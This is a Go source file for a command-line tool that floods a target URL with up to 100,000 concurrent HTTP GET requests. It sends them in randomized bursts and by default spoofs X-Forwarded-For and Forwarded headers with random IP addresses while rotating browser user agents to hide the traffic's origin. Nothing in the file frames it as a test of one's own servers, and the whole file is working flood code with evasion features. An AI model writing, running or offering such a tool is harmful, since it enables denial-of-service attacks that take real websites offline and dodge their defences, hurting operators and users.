package main

import (
	"context"
	"crypto/rand"
	"flag"
	"fmt"
	"math/big"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
)

var (
	client     *http.Client
	timeoutDur time.Duration = 64 * time.Second
	reqmu      sync.Mutex
	suc, fail  int
)

func fetchpag(urlStr string, mask bool) {
	ctx, cancel := context.WithTimeout(context.Background(), timeoutDur)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, "GET", urlStr, nil)
	if err != nil {
		fmt.Printf("Error creating request for URL %s: %v\n", urlStr, err)
		updateStats(0)
		return
	}
	if mask {
		userAgents := []string{
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/134.0.0.0",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/128.0.6789.125 Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
		}
		randomIndex := randomInt(0, len(userAgents)-1)
		fIP := generateIP()
		req.Header.Set("Forwarded", fmt.Sprintf("for=%s; proto=https", fIP))
		req.Header.Set("X-Forwarded-For", fIP)
		req.Header.Set("User-Agent", userAgents[randomIndex])
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0")
	}
	resp, err := client.Do(req)
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			fmt.Printf("Request to %s timed out after %d seconds\n", urlStr, int(timeoutDur))
			updateStats(503)
			return
		}
		fmt.Printf("Error fetching URL %s: %v\n", urlStr, err)
		updateStats(404)
		return
	}
	defer resp.Body.Close()
	updateStats(resp.StatusCode)
	return
}

func generateIP() string {
	var firstOctet int
	class := randomInt(1, 3)
	switch class {
	case 1:
		firstOctet = randomInt(1, 126)
	case 2:
		firstOctet = randomInt(128, 191)
	case 3:
		firstOctet = randomInt(192, 223)
	}
	secondOctet := randomInt(0, 255)
	thirdOctet := randomInt(1, 255)
	fourthOctet := randomInt(1, 254)
	return fmt.Sprintf("%d.%d.%d.%d", firstOctet, secondOctet, thirdOctet, fourthOctet)
}

func randomInt(min, max int) int {
	nBig, err := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	if err != nil {
		return min
	}
	return int(nBig.Int64()) + min
}

func randomizedRamp(numRequests int, fn func()) {
	remaining := numRequests
	divisor := float64(randomInt(1100, 1600)) / 1000.0
	minBatchBase := int(float64(numRequests) / divisor)
	for remaining > 0 {
		randMin := randomInt(6400, 10000)
		minBatch := randMin
		if minBatchBase > randMin {
			minBatch = minBatchBase
		}
		if minBatch > remaining {
			minBatch = remaining
		}
		batchSize := randomInt(minBatch, remaining)
		for i := 0; i < batchSize; i++ {
			go fn()
		}
		remaining -= batchSize
		time.Sleep(time.Duration(randomInt(128, 640)) * time.Millisecond)
	}
}

func updateStats(code int) {
	reqmu.Lock()
	defer reqmu.Unlock()
	if code >= 200 && code < 300 {
		suc++
	} else {
		fail++
	}
}

func printStat() {
	reqmu.Lock()
	defer reqmu.Unlock()
	fmt.Printf("Successful requests: %d\nUnsuccessful requests: %d\n", suc, fail)
	fmt.Printf("Total requests: %d\n", suc+fail)
}

func main() {
	urlPtr := flag.String("url", "", "Target URL (required)")
	requestsPtr := flag.Int("requests", 1, "Number of requests (default: random 20-32)")
	alivePtr := flag.Bool("keepalive", true, "Keep connections alive (default: true)")
	rampPtr := flag.Bool("ranramp", false, "Enable randomized request ramp-up")
	maskPtr := flag.Bool("mask", true, "Use IP masking (default: true)")
	helpPtr := flag.Bool("help", false, "Show help message")
	flag.Parse()
	if *helpPtr || *urlPtr == "" {
		fmt.Fprintf(os.Stderr, "Usage: %s [flags]\n\nFlags:\n", os.Args[0])
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExamples:\n  %s -url https://example.com -ranramp\n  %s -url https://example.com -requests 50 -mask=false\n", os.Args[0], os.Args[0])
		os.Exit(0)
	}
	url := *urlPtr
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		url = "http://" + url
	}
	numRequests := *requestsPtr
	if numRequests <= 0 {
		numRequests = randomInt(20, 32)
		fmt.Printf("Using random number of requests: %d\n", numRequests)
	}
	if numRequests > 100000 {
		fmt.Printf("Cannot create more than 100000 requests, given %d requests\nCreating 100000 requests\n", numRequests)
		numRequests = 100000
	}
	mask := *maskPtr
	client = &http.Client{
		Timeout: timeoutDur,
		Transport: &http.Transport{
			MaxIdleConnsPerHost: func(a, b int) int {
				if a < b {
					return b
				} else {
					return a
				}
			}(numRequests, 8192) * func(b bool) int {
				if b {
					return 1
				}
				return 0
			}(*alivePtr),
			IdleConnTimeout: time.Duration(randomInt(124, 174)) * time.Second,
		},
	}
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		printStat()
		fmt.Println("Requests interrupted")
		os.Exit(0)
	}()
	fmt.Printf("Starting %d requests to %s, use ctrl+c to stop...\n", numRequests, url)
	var wg sync.WaitGroup
	if *rampPtr {
		randomizedRamp(numRequests, func() {
			wg.Add(1)
			go func() {
				defer wg.Done()
				fetchpag(url, mask)
			}()
		})
	} else {
		for i := 0; i < numRequests; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				fetchpag(url, mask)
			}()
		}
	}
	wg.Wait()
	fmt.Print("\n")
	printStat()
	fmt.Println("Requests completed")
}
